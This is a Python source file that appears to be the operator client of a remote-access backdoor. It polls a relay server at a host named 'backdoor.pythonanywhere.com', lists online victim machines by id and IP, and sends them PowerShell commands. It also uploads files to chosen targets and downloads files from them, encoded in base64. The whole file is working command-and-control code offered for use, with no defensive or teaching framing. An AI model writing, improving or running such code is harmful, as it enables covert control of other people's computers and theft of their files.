from typing import Callable
import requests
import json
import threading
import base64
import os
import time


# SERVER_IP = 'http://127.0.0.1:5000'
SERVER_IP = 'https://backdoor.pythonanywhere.com'

cd: str = ''
lastest = None
terminate = False
proceed = True
send_t: threading.Thread = None


def select_target():
    response = requests.get(SERVER_IP + '/targets')
    targets: dict = response.json()
    if not targets:
        print("No targets are currently online.")
        exit(1)
    print("Available targets:")
    for i, (tid, ip) in enumerate(targets.items()):
        print(f"[{i}]: {tid} ({ip})")

    while True:
        try:
            choice = int(input("Select target by number: "))
            if 0 <= choice < len(targets):
                selected_id = list(targets.keys())[choice]
                return selected_id
            else:
                print("Invalid selection.")
        except ValueError:
            print("Please enter a number.")


def recv(client_recv: Callable[[], requests.Response]):
    global cd, lastest, proceed
    time.sleep(0.5)
    
    resp: requests.Response = client_recv()
    resp = resp.text
    cd = 'PS ' + json.loads(resp)['output'] + '>'
    while not terminate:
        try:
            resp = json.loads(client_recv().text)
            cd = 'PS ' + resp['cwd'] + '>'
            if 'download' in resp:
                filename = resp['download']['filename']
                filedata = base64.b64decode(resp['download']['filedata'])
                with open(filename, 'wb') as f:
                    f.write(filedata)
                lastest = f"Downloaded file saved as: {filename}"
            else:
                lastest = resp['output'] if resp['output'] is not None else '\033[31m' + str(resp['error']) + '\033[0m'
        except requests.exceptions.ReadTimeout:
            continue


def send(client_send):
    global lastest, terminate, proceed
    if terminate: return
    cmd = ''
    while not cmd == 'exit':
        if lastest is not None:
            print(lastest, flush=True)
            lastest = None
            proceed = True

        if not proceed:
            continue

        cmd = input(cd)

        if cmd.startswith('upload '):
            path = cmd.split(maxsplit=1)[1]
            filename = os.path.basename(path)
            try:
                with open(path, 'rb') as f:
                    file_data = base64.b64encode(f.read()).decode()
                client_send({
                    'command': 'upload',
                    'filename': filename,
                    'filedata': file_data
                })
            except Exception as e:
                print(f"\033[31mUpload failed: {e}\033[0m")
                proceed = True
                continue

            proceed = False
            continue
        
        client_send({'command': cmd})
        proceed = False
    terminate = True


def main():
    global send_t, terminate
    target_id = select_target()

    def client_send(payload):
        requests.post(f"{SERVER_IP}/client/send/{target_id}", json=payload)

    def client_recv():
        while not terminate:
            resp = requests.post(f"{SERVER_IP}/client/recv/{target_id}", timeout=10)
            if resp.status_code != 204:
                return resp
            
    
    client_send({'command': 'cd'})
    recv_t = threading.Thread(target=recv, args=(client_recv,))
    recv_t.start()
    while not terminate:
        send_t = threading.Thread(target=send, args=(client_send,))
        send_t.start()
        send_t.join()


if __name__ == '__main__':
    main()